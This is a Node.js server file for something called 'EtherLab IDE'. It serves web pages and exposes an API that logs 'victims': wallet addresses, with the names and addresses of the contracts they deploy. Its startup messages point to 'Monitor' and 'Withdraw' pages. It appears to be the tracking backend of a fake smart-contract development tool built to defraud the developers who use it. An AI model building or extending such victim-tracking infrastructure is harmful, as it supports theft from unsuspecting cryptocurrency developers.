const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const DATA_FILE = path.join(__dirname, 'victims.json');

// Initialize data file
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, '{}');
}

const server = http.createServer((req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  // API: Get users (support both /api/users and /api/victims)
  if ((req.url === '/api/users' || req.url === '/api/victims') && req.method === 'GET') {
    try {
      const data = fs.readFileSync(DATA_FILE, 'utf8');
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(data);
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  // API: Save users (support both /api/users and /api/victims)
  if ((req.url === '/api/users' || req.url === '/api/victims') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  // API: Add single user (support both endpoints)
  if ((req.url === '/api/users/add' || req.url === '/api/victims/add') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const { wallet, contractName, contractAddr } = JSON.parse(body);
        let users = {};
        try { users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch {}
        
        if (!users[wallet]) {
          users[wallet] = { firstSeen: new Date().toLocaleString(), contracts: [] };
        }
        
        if (contractAddr && !users[wallet].contracts.some(c => c.address.toLowerCase() === contractAddr.toLowerCase())) {
          users[wallet].contracts.push({
            name: contractName || 'Unknown',
            address: contractAddr,
            deployedAt: new Date().toLocaleString()
          });
        }
        
        users[wallet].lastSeen = new Date().toLocaleString();
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, users }));
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  // Serve static files
  let urlPath = req.url.split('?')[0]; // Remove query params
  let filePath = path.join(__dirname, urlPath === '/' ? 'index.html' : urlPath);
  
  // If no extension, try adding .html
  if (!path.extname(filePath)) {
    filePath = filePath + '.html';
  }
  
  // Security: prevent directory traversal
  if (!filePath.startsWith(__dirname)) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  const ext = path.extname(filePath).toLowerCase();
  const mimeTypes = {
    '.html': 'text/html',
    '.js': 'text/javascript',
    '.css': 'text/css',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
  };

  fs.readFile(filePath, (err, content) => {
    if (err) {
      if (err.code === 'ENOENT') {
        // Try index.html as fallback for SPA
        fs.readFile(path.join(__dirname, 'index.html'), (err2, content2) => {
          if (err2) {
            res.writeHead(404);
            res.end('Not Found: ' + urlPath);
          } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content2);
          }
        });
      } else {
        res.writeHead(500);
        res.end('Server Error');
      }
      return;
    }

    res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'text/plain' });
    res.end(content);
  });
});

server.listen(PORT, () => {
  console.log(`EtherLab IDE running at http://localhost:${PORT}`);
  console.log(`Monitor: http://localhost:${PORT}/monitor.html`);
  console.log(`Withdraw: http://localhost:${PORT}/withdraw.html`);
});